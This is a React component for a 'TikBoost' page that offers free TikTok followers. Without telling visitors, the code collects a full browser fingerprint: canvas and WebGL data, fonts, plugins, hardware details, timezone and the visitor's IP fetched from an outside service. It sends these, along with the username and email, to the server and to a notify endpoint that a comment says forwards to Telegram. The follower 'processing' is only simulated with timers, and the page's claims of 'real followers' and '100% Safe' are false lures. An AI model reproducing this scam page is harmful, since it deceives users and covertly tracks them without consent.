import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { insertSubmissionSchema } from "@shared/schema";
import { z } from "zod";
import { 
  Form, 
  FormControl, 
  FormField, 
  FormItem, 
  FormLabel, 
  FormMessage 
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import Countdown from "@/components/Countdown";
import ProcessingAnimation from "@/components/ProcessingAnimation";
import SuccessMessage from "@/components/SuccessMessage";
import { Loader2, Sparkles, ShieldCheck, Lock, CheckCircle, Flame, TrendingUp } from "lucide-react";

// Extend schema for frontend validation
const formSchema = insertSubmissionSchema.extend({
  username: z.string()
    .min(3, "Username must be at least 3 characters long")
    .max(30, "Username must be less than 30 characters")
    .regex(/^[a-zA-Z0-9._]+$/, "Username can only contain letters, numbers, period and underscore"),
});

type FormValues = z.infer<typeof formSchema>;

export default function FollowerForm() {
  const [formStep, setFormStep] = useState<'form' | 'processing' | 'success'>('form');
  const [selectedAmount, setSelectedAmount] = useState<number>(5000);
  const { toast } = useToast();
  const [userInfo, setUserInfo] = useState({
    screenSize: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    language: navigator.language,
    languages: Array.from(navigator.languages || []).join(','),
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    deviceMemory: (navigator as any).deviceMemory || 'unknown',
    hardwareConcurrency: navigator.hardwareConcurrency,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || (window as any).doNotTrack || 'unknown',
    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
    ip: '',
    canvasFingerprint: '',
    webglFingerprint: '',
    fonts: '',
    connection: (navigator as any).connection ? {
      downlink: (navigator as any).connection.downlink,
      effectiveType: (navigator as any).connection.effectiveType,
      rtt: (navigator as any).connection.rtt,
      saveData: (navigator as any).connection.saveData
    } : 'unknown'
  });
  
  // Get visitor IP address
  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        setUserInfo(prev => ({
          ...prev,
          ip: data.ip
        }));
      })
      .catch(error => console.error('Error fetching IP:', error));
    
    // Create canvas fingerprint
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      if (ctx) {
        canvas.width = 200;
        canvas.height = 200;
        
        // Draw background
        ctx.fillStyle = 'rgb(255,255,255)';
        ctx.fillRect(0, 0, 200, 200);
        
        // Draw text
        ctx.fillStyle = 'rgb(0,0,0)';
        ctx.font = '18px Arial';
        ctx.fillText('TikTok Fingerprint 👑', 10, 50);
        ctx.fillText(navigator.userAgent, 10, 70);
        
        // Draw shapes
        ctx.strokeStyle = 'rgb(255,0,255)';
        ctx.beginPath();
        ctx.arc(100, 100, 50, 0, Math.PI*2);
        ctx.stroke();
        
        // Generate hash from canvas data
        const dataUrl = canvas.toDataURL();
        setUserInfo(prev => ({
          ...prev,
          canvasFingerprint: dataUrl.slice(0, 100) + '...'
        }));
      }
    } catch (e) {
      console.error('Canvas fingerprinting error:', e);
    }
    
    // Create WebGL fingerprint
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (gl) {
        const webglInfo = {
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER),
          version: gl.getParameter(gl.VERSION)
        };
        setUserInfo(prev => ({
          ...prev,
          webglFingerprint: JSON.stringify(webglInfo)
        }));
      }
    } catch (e) {
      console.error('WebGL fingerprinting error:', e);
    }
    
    // Detect available fonts
    const fontList = [
      'Arial', 'Courier New', 'Georgia', 'Times New Roman', 
      'Verdana', 'Tahoma', 'Impact', 'Comic Sans MS'
    ];
    const availableFonts = fontList.filter(font => {
      const testElement = document.createElement('span');
      testElement.style.fontFamily = `'${font}', monospace`;
      document.body.appendChild(testElement);
      const computedStyle = window.getComputedStyle(testElement);
      const detected = computedStyle.fontFamily !== 'monospace';
      document.body.removeChild(testElement);
      return detected;
    });
    
    setUserInfo(prev => ({
      ...prev,
      fonts: availableFonts.join(', ')
    }));
  }, []);
  
  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      username: "",
      followersRequested: 5000,
      email: "",
    },
    mode: "onChange",
  });
  
  const mutation = useMutation({
    mutationFn: async (values: FormValues) => {
      // Combine form values with user info
      const payload = {
        ...values,
        userInfo: userInfo
      };
      const data = await apiRequest("POST", "/api/submit", payload);
      return data.json();
    },
    onSuccess: (data) => {
      setFormStep('processing');
      
      // Send notification to Telegram (this would be implemented on the server-side)
      fetch("/api/notify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: form.getValues("username"),
          followers: selectedAmount,
          userInfo: userInfo
        })
      }).catch(err => console.error("Notification error", err));
      
      // Simulate processing for demonstration purposes
      setTimeout(() => {
        setFormStep('success');
        
        // Redirect to thank you page after a short delay
        setTimeout(() => {
          window.location.href = `/thank-you/${data.submission.id}`;
        }, 2000);
      }, 3000);
    },
    onError: (error) => {
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to submit your request",
        variant: "destructive",
      });
    },
  });
  
  const onSubmit = (values: FormValues) => {
    // Set the number of followers based on the selected amount
    values.followersRequested = selectedAmount;
    mutation.mutate(values);
  };
  
  const selectFollowerAmount = (amount: number) => {
    setSelectedAmount(amount);
    form.setValue("followersRequested", amount);
  };
  
  return (
    <section id="boost-now" className="min-h-screen bg-black text-white">
      {/* Animated TikTok background */}
      <div className="absolute inset-0 overflow-hidden opacity-30">
        <div className="absolute top-10 left-10 w-40 h-40 rounded-full bg-[#25F4EE] blur-3xl animate-pulse"></div>
        <div className="absolute bottom-20 right-10 w-60 h-60 rounded-full bg-[#FE2C55] blur-3xl animate-pulse"></div>
        <div className="absolute top-1/3 right-1/4 w-32 h-32 rounded-full bg-white blur-3xl animate-pulse"></div>
      </div>
      
      <div className="relative pt-10 pb-20 px-4 md:px-8 z-10">
        <div className="max-w-5xl mx-auto">
          {/* Header logo */}
          <div className="flex justify-center mb-10">
            <div className="flex items-center space-x-2">
              <div className="relative h-12 w-12 rounded-full bg-black border-2 border-white flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="h-6 w-6 fill-current text-white">
                  <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/>
                </svg>
                <div className="absolute -top-1 -right-1 h-3 w-3 bg-[#FE2C55] rounded-full animate-ping"></div>
              </div>
              <h1 className="text-3xl font-montserrat font-bold bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] bg-clip-text text-transparent">TikBoost</h1>
            </div>
          </div>
          
          <div className="text-center mb-12">
            <div className="inline-block mb-5 px-5 py-2 bg-[#1D1D1D] rounded-full text-sm font-medium border border-gray-800 animate-pulse">
              <span className="text-[#25F4EE] flex items-center">
                <Flame className="h-4 w-4 mr-1 text-[#FE2C55]" /> HOT DEAL 
                <span className="mx-2 text-gray-500">|</span>
                <span className="text-white">LIMITED TIME ONLY</span>
              </span>
            </div>
            <h2 className="text-4xl md:text-6xl font-montserrat font-bold mb-6 leading-tight">
              Get Up To <span className="bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] bg-clip-text text-transparent">5,000</span> Free<br /> TikTok Followers
            </h2>
            <p className="text-xl text-gray-300 max-w-2xl mx-auto leading-relaxed">
              Boost your TikTok presence instantly with real followers.
              No password required - just enter your username!
            </p>
          </div>
          
          {/* Phone mockup with form */}
          <div className="max-w-6xl mx-auto grid md:grid-cols-5 gap-8 items-center">
            {/* Phone mockup */}
            <div className="md:col-span-2 hidden md:block">
              <div className="relative mx-auto w-[280px]">
                <div className="relative z-10 bg-black rounded-[40px] border-4 border-gray-800 overflow-hidden w-full aspect-[9/19] shadow-2xl">
                  <div className="absolute top-0 inset-x-0 h-6 bg-black rounded-t-2xl"></div>
                  <div className="absolute top-1.5 inset-x-0 flex justify-center">
                    <div className="h-2 w-20 bg-gray-800 rounded-full"></div>
                  </div>
                  <div className="h-full pt-6 bg-gradient-to-b from-gray-900 to-black">
                    <div className="flex justify-between items-center px-4 mb-4">
                      <svg viewBox="0 0 24 24" className="h-6 w-6 fill-current text-white">
                        <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/>
                      </svg>
                      <div className="text-white text-sm font-medium">For You</div>
                      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6 text-white">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                      </svg>
                    </div>
                    
                    <div className="flex-grow flex justify-center items-center h-5/6">
                      <div className="text-center">
                        <div className="w-20 h-20 bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] rounded-full flex items-center justify-center mx-auto mb-5">
                          <TrendingUp className="h-10 w-10 text-white" />
                        </div>
                        <div className="text-xl font-bold text-white mb-2">Get Followers</div>
                        <div className="text-sm text-gray-400">+5000 followers available</div>
                        <div className="animate-bounce mt-6">
                          <Sparkles className="h-6 w-6 text-[#25F4EE] mx-auto" />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {/* Form */}
            <div className="md:col-span-3">
              <div className="bg-[#1D1D1D] rounded-3xl p-8 shadow-[0_5px_30px_rgba(0,0,0,0.3)] border border-gray-800">
                {formStep === 'form' && (
                  <Form {...form}>
                    <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-7">
                      <FormField
                        control={form.control}
                        name="username"
                        render={({ field }) => (
                          <FormItem className="space-y-3">
                            <FormLabel className="text-lg font-semibold text-white flex items-center">
                              <div className="mr-2 h-6 w-6 rounded-full bg-[#25F4EE] flex items-center justify-center text-black font-bold">@</div>
                              TikTok Username
                            </FormLabel>
                            <div className="relative">
                              <span className="absolute inset-y-0 left-0 pl-5 flex items-center text-gray-400 text-xl">@</span>
                              <FormControl>
                                <Input
                                  placeholder="your_username"
                                  className="w-full h-16 bg-[#0d0d0d] border-2 border-gray-800 hover:border-[#25F4EE] focus:border-[#25F4EE] rounded-2xl py-6 pl-10 pr-3 text-white text-lg placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-[#25F4EE] transition-all"
                                  {...field}
                                />
                              </FormControl>
                            </div>
                            <FormMessage className="text-[#FE2C55] text-sm font-medium" />
                          </FormItem>
                        )}
                      />
                      
                      <div className="space-y-4">
                        <FormLabel className="text-lg font-semibold text-white flex items-center">
                          <div className="mr-2 h-6 w-6 rounded-full bg-[#FE2C55] flex items-center justify-center text-white font-bold">+</div>
                          Select Followers
                        </FormLabel>
                        <div className="grid grid-cols-3 gap-4">
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(1000)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 1000 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616]
                            `}
                          >
                            1,000
                          </Button>
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(2500)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 2500 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616]
                            `}
                          >
                            2,500
                          </Button>
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(5000)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 5000 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616] relative overflow-hidden
                            `}
                          >
                            5,000
                            {selectedAmount === 5000 && (
                              <div className="absolute -top-1 -right-1 h-5 w-5 bg-[#FE2C55] rounded-full flex items-center justify-center text-white text-xs font-bold">
                                <CheckCircle className="h-3 w-3" />
                              </div>
                            )}
                          </Button>
                        </div>
                      </div>
                      
                      <Button 
                        type="submit" 
                        className="w-full h-16 bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] hover:from-[#20E5DF] hover:to-[#F01B48] text-white text-xl font-bold py-4 rounded-2xl transition-all transform hover:scale-[1.02] focus:outline-none"
                        disabled={mutation.isPending}
                      >
                        {mutation.isPending ? (
                          <>
                            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                            Processing...
                          </>
                        ) : (
                          <>
                            <Sparkles className="mr-2 h-5 w-5" />
                            Get Free Followers
                          </>
                        )}
                      </Button>
                      
                      <div className="flex items-center justify-center gap-4 pt-2">
                        <div className="flex items-center text-gray-400 text-sm">
                          <ShieldCheck className="mr-1 h-4 w-4 text-[#25F4EE]" /> 100% Safe
                        </div>
                        <div className="flex items-center text-gray-400 text-sm">
                          <Lock className="mr-1 h-4 w-4 text-[#25F4EE]" /> No Password Required
                        </div>
                      </div>
                    </form>
                  </Form>
                )}
                
                {formStep === 'processing' && <ProcessingAnimation />}
                
                {formStep === 'success' && (
                  <SuccessMessage 
                    username={form.getValues("username")} 
                    followers={selectedAmount.toString()} 
                  />
                )}
              </div>
            </div>
          </div>
          
          {/* Trust signals */}
          <div className="mt-12 text-center">
            <div className="flex flex-wrap justify-center gap-6 md:gap-10">
              <div className="flex items-center gap-2">
                <CheckCircle className="h-5 w-5 text-[#25F4EE]" />
                <span className="text-gray-300">Real Followers</span>
              </div>
              <div className="flex items-center gap-2">
                <ShieldCheck className="h-5 w-5 text-[#25F4EE]" />
                <span className="text-gray-300">100% Secure</span>
              </div>
              <div className="flex items-center gap-2">
                <Flame className="h-5 w-5 text-[#FE2C55]" />
                <span className="text-gray-300">Instant Delivery</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
